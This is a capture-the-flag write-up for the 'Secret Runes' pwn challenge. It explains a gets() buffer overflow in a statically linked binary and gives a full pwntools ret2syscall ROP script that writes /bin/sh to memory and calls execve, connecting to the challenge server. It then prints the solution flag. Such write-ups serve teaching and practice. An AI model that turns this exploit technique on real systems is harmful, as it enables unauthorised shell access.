# Secret Runes

The Return of Odin is near. Find the secret runes and prove yourself worthy of Valhalla and eternal glory!

Note: The flag format should be SIVBGR{}.

nc 167.99.118.184 31338


## Challenge

Running checksec to see protections and file to see what we are working with:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```
└─$ file norse_chronicles2 
norse_chronicles2: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=2b69564eaeeb459b70c01294d870e57bcfb0037a, for GNU/Linux 3.2.0, not stripped
```

So automatically first thing I notice is we are working with a statically linked binary.

```
└─$ ./norse_chronicles2
Enter the runes of Yggdrasil:
Hello
You have not yet discovered the secrets.
```

Running the binary here doesn't really give us much so let's decompile and look at some code.

```c
undefined8 main(void)
{
  init();
  vulnerable_function();
  puts("You have not yet discovered the secrets.");
  return 0;
}

void vulnerable_function(void)
{
  char local_88 [128];
  
  puts("Enter the runes of Yggdrasil:");
  gets(local_88);
  return;
}
```

Here I have pulled out the main function and the function it calls from ghidra. We can see we have a blatant buffer overflow with no restrictions. And knowing that we are working with a static binary we can execute a ret2syscall attack.

I recently became familiar with [this technique](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/rop-syscall-execv) and it made solving this challenge extremely easy. The only thing I needed to do was gather some gadgets and then write `/bin/sh` into memory and call execve with that address as an argument.

As far as getting writable memory, we can run the program in gdb and use vmmap:
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000001000 r-- /cyberopen/pwn/secret_runes/norse_chronicles2
0x0000000000401000 0x000000000049a000 0x0000000000099000 r-x /cyberopen/pwn/secret_runes/norse_chronicles2
0x000000000049a000 0x00000000004c3000 0x0000000000029000 r-- /cyberopen/pwn/secret_runes/norse_chronicles2
0x00000000004c4000 0x00000000004cb000 0x0000000000007000 rw- /cyberopen/pwn/secret_runes/norse_chronicles2
0x00000000004cb000 0x00000000004d0000 0x0000000000005000 rw- [heap]
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000004000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 rw- [stack]
gef➤  
```
We can see that any address `0x00000000004c4000 - 0x00000000004d0000` is writable.

And in order to get our `/bin/sh` into that writable memory we will look for a `mov` instruction that will allow us to move it into that memory address after storing it in a register.

```python
from pwn import *

elf = context.binary = ELF('./norse_chronicles2')
#p = process('./norse_chronicles2')
p = remote('167.99.118.184', 31338)

#Offset to rip
offset = 136

#Gadgets used in ROP
pop_rdi = 0x0000000000401fdf # pop rdi ; ret
pop_rsi = 0x000000000040a04e # pop rsi ; ret
pop_rax_rdx_rbx = 0x000000000048101a # pop rax ; pop rdx ; pop rbx ; ret
syscall = 0x0000000000401d94 # syscall
writable_mem = 0x00000000004c8000
mov_rax_rdx_pop_rbx = 0x000000000048f958 # mov qword ptr [rax], rdx ; pop rbx ; ret
ret = 0x000000000040101a # ret

rop = b''
rop += p64(ret)

#Assigning rax writable memory address and rdx the string we want
rop += p64(pop_rax_rdx_rbx)
rop += p64(writable_mem) + b"/bin/sh\x00" + p64(0)

#Moving the string into writable memory for access
rop += p64(mov_rax_rdx_pop_rbx)
rop += p64(0)

#Rax to 0x3b for execve, rdx to 0
rop += p64(pop_rax_rdx_rbx)
rop += p64(0x3b) + p64(0) + p64(0)

#rdi to our /bin/sh and rsi to 0
rop += p64(pop_rdi)
rop += p64(writable_mem)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(syscall)

#Sendoff
payload = offset*b'A' + rop
p.sendline(payload)
p.interactive()
```

Running this script sets the binary up to execute the syscall and pop a shell.

## Flag

`SIVBGR{W3lc0m3_2_v4llh4lla}`
